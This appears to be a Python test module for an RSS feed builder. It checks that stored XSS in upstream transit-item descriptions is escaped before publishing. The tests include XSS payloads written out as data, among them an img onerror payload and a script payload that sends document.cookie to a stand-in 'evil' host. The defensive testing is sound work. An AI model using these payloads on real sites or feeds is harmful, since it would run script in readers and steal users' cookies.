"""Stored HTML/JS injection (XSS) in the published per-item ``<description>``.

Threat model (project Zero-Trust upstream contract, AGENTS.md §3): a
compromised / MITM'd transit API serves an item ``description`` carrying
entity-escaped angle brackets, e.g. ``&lt;img src=x onerror=...&gt;`` (the
literal form for JSON providers; the double-escaped ``&amp;lt;...`` form for
XML providers that survives one XML-decode layer).

``html_to_text`` runs the description through ``HTMLParser(convert_charrefs=
True)``, which DECODES those entities back into live ``<`` / ``>`` characters
in its *plain-text* output. That plain text becomes ``summary`` and flows into
``_compose_description`` -> ``desc_text_truncated`` -> the per-item
``<description>`` element (``src/build_feed.py:_emit_item``).

``<description>`` is an XML TEXT node, so ElementTree escapes ``<>&`` for XML
well-formedness on serialise. That is the trap the sibling ``<content:encoded>``
fix (2026-05-24) explicitly left open with the comment *"ElementTree applies
the correct XML escaping there"*: a conformant RSS reader XML-decodes the node
exactly ONCE and the overwhelming majority then render the result as HTML (RSS
2.0 ``<description>`` is HTML by convention). After that single XML-decode the
escaped ``&lt;img onerror=...&gt;`` becomes the live ``<img onerror=...>`` and
executes in the subscriber's reader.

The fix HTML-escapes the body at the ``<description>`` sink in
:func:`_emit_item` (contextual output-encoding for the XML-text-node-rendered-
as-HTML context) so the reader's lone XML-decode yields inert ``&lt;img...&gt;``
*source* text. ``_emit_item`` is the single per-item ``<description>`` sink for
both the DE and EN feeds.
"""

from __future__ import annotations

import xml.etree.ElementTree as ET
from datetime import UTC, datetime
from html.parser import HTMLParser
from typing import Any, cast

from src import build_feed as bf
from src.feed_types import FeedItem

_NOW = datetime(2026, 5, 25, 12, 0, tzinfo=UTC)


class _ReaderModel(HTMLParser):
    """Render a ``<description>`` body the way a feed reader would.

    ``convert_charrefs=True`` mirrors real reader/browser behaviour: an
    entity-escaped ``&lt;img&gt;`` decodes to *visible text*, never to a live
    tag, whereas a raw ``<img>`` is parsed as an executable element.
    """

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.live_tags: list[str] = []
        self.event_handler_attrs: list[tuple[str, str]] = []
        self._text: list[str] = []

    def handle_starttag(
        self, tag: str, attrs: list[tuple[str, str | None]]
    ) -> None:
        self.live_tags.append(tag)
        for name, _value in attrs:
            if name.lower().startswith("on"):
                self.event_handler_attrs.append((tag, name.lower()))

    def handle_startendtag(
        self, tag: str, attrs: list[tuple[str, str | None]]
    ) -> None:
        self.handle_starttag(tag, attrs)

    def handle_data(self, data: str) -> None:
        self._text.append(data)

    @property
    def visible_text(self) -> str:
        return "".join(self._text)


def _published_description_textnode(description: str) -> str:
    """Return the ``<description>`` content as the reader's XML parser sees it.

    Drives the real per-item builder (``src/build_feed.py:_emit_item``),
    serialises the actually-published ``<description>`` element to XML bytes,
    then re-parses them so the returned string is what a reader gets *after its
    single XML-decode* — i.e. the exact input handed to HTML rendering.
    """
    state: dict[str, dict[str, Any]] = {}
    item = cast(
        FeedItem,
        {
            "title": "Streckeninformation",
            "link": "https://example.com/incident",
            "description": description,
            "guid": "incident-1",
            "source": "ÖBB",
            "starts_at": datetime(2026, 5, 24, tzinfo=UTC),
        },
    )
    _ident, element, _replacements = bf._emit_item(item, _NOW, state)
    desc_el = element.find("description")
    assert desc_el is not None
    published_xml = ET.tostring(desc_el, encoding="unicode")
    decoded = ET.fromstring(published_xml).text  # reader's single XML-decode  # noqa: S314
    return decoded or ""


def _render(body: str) -> _ReaderModel:
    reader = _ReaderModel()
    reader.feed(body)
    reader.close()
    return reader


def test_entity_escaped_img_onerror_is_inert_in_description() -> None:
    payload = "&lt;img src=x onerror=alert(document.domain)&gt; Strecke gesperrt"
    decoded = _published_description_textnode(payload)
    reader = _render(decoded)

    # No executable tag / event handler may survive into the rendered HTML.
    assert "img" not in reader.live_tags
    assert reader.event_handler_attrs == []

    # The reader's XML-decoded view is inert escaped source, not a live tag.
    assert "<img" not in decoded
    assert "&lt;img" in decoded
    assert "Strecke gesperrt" in reader.visible_text


def test_double_escaped_script_is_inert_in_description() -> None:
    payload = "&lt;script&gt;fetch('//evil/?'+document.cookie)&lt;/script&gt; Info"
    decoded = _published_description_textnode(payload)
    reader = _render(decoded)

    assert "script" not in reader.live_tags
    assert "<script" not in decoded
    assert "&lt;script&gt;" in decoded
    assert "Info" in reader.visible_text


def test_legitimate_ampersand_renders_correctly_in_description() -> None:
    # Happy path: a literal '&' is correctly carried so an HTML-rendering
    # reader displays '&' (not a broken/eaten entity) and no tag is injected.
    decoded = _published_description_textnode("Wien & Graz gesperrt")
    reader = _render(decoded)

    assert reader.live_tags == []
    assert reader.event_handler_attrs == []
    assert "Wien & Graz gesperrt" in reader.visible_text


def test_published_description_textnode_is_html_escaped_at_sink() -> None:
    # Sink-level guard: the published <description> text node carries the
    # HTML-escaped form of an injected tag so that the reader's single
    # XML-decode cannot reconstitute a live element. ``desc_text_truncated``
    # itself stays plain text (the directional-marker / truncation tests rely
    # on that); the encoding is applied at the _emit_item sink.
    # Entity-escaped upstream form: html_to_text decodes ``&lt;b&gt;`` to the
    # literal ``<b>`` *text* that survives into the description body (a real
    # ``<b>`` tag would instead be stripped as markup by html_to_text).
    decoded = _published_description_textnode("&lt;b&gt;x&lt;/b&gt; upstream")
    assert "<b>" not in decoded
    assert "&lt;b&gt;x&lt;/b&gt;" in decoded
